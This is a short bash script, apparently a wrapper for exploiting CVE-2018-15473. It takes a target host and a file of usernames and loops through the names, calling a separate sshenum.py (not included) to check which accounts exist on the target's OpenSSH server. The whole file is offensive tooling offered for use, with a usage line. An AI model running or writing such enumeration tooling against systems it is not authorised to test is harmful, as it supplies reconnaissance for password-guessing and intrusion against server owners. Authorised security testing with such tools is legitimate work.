#!/bin/bash
# Exploits CVE-2018-15473 to enumerate OpenSSH usernames

# Help menu
function help() {
	echo usage: suf.sh target userfile
	exit 1
}

if [ $# -le 1 ]; then
	help
	exit 1
fi

userfile=$( cat $2 )

echo "Checking $1 for valid users..."
sleep 3
for i in $userfile; do
	python sshenum.py $1 $i
done
